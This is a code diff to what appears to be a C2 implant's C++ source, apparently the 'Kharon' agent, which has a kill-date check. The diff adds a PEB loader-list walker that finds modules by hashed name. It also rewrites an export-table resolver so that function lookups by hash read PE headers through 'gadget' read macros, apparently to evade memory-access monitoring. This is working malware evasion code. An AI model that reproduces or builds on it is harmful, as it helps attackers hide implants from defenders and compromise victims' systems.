@@ -514,6 +514,22 @@ auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
     }
 }
 
+auto DECLFN Useful::ModulePath(
+    _In_ UPTR LibHash
+) -> UPTR {
+    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
+        if ( !LibHash ) {
+            return reinterpret_cast<UPTR>( Entry->OriginalBase );
+        }
+
+        if ( Hsh::Str<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
+            return reinterpret_cast<UPTR>( Entry->FullDllName.Buffer );
+        }
+     } )
+ 
+     return 0;
+}
+
 auto DECLFN LdrLoad::Module(
     _In_ const ULONG LibHash
 ) -> UPTR {
@@ -534,6 +550,10 @@ auto DECLFN LdrLoad::_Api(
     _In_ const UPTR ModBase,
     _In_ const UPTR SymbHash
 ) -> UPTR {
+    G_KHARON
+    
+    if ( ! ModBase || ! SymbHash ) return 0;
+
     auto FuncPtr    = UPTR { 0 };
     auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
     auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
@@ -544,28 +564,28 @@ auto DECLFN LdrLoad::_Api(
     auto SymbName   = PSTR { nullptr };
 
     DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
-    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
+    if ( MM_GADGET_READ_16( &DosHdr->e_magic ) != IMAGE_DOS_SIGNATURE ) {
         return 0;
     }
 
-    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
-    if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
+    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + MM_GADGET_READ_32( &DosHdr->e_lfanew ) );
+    if ( MM_GADGET_READ_32( &NtHdr->Signature ) != IMAGE_NT_SIGNATURE ) {
         return 0;
     }
 
-    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
-    ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
-    ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
-    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );
+    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + MM_GADGET_READ_32( &NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress ) );
+    ExpNames   = reinterpret_cast<PDWORD>( ModBase + MM_GADGET_READ_32( &ExpDir->AddressOfNames ) );
+    ExpAddress = reinterpret_cast<PDWORD>( ModBase + MM_GADGET_READ_32( &ExpDir->AddressOfFunctions ) );
+    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + MM_GADGET_READ_32( &ExpDir->AddressOfNameOrdinals ) );
 
-    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
-        SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );
+    for ( int i = 0; i < MM_GADGET_READ_32( &ExpDir->NumberOfNames ); i++ ) {
+        SymbName = reinterpret_cast<PSTR>( ModBase + MM_GADGET_READ_32( &ExpNames[ i ] ) );
 
         if ( Hsh::Str( SymbName ) != SymbHash ) {
             continue;
         }
 
-        FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];
+        FuncPtr = ModBase + MM_GADGET_READ_32( &ExpAddress[ ExpOrds[ i ] ] );
 
         break;
     }
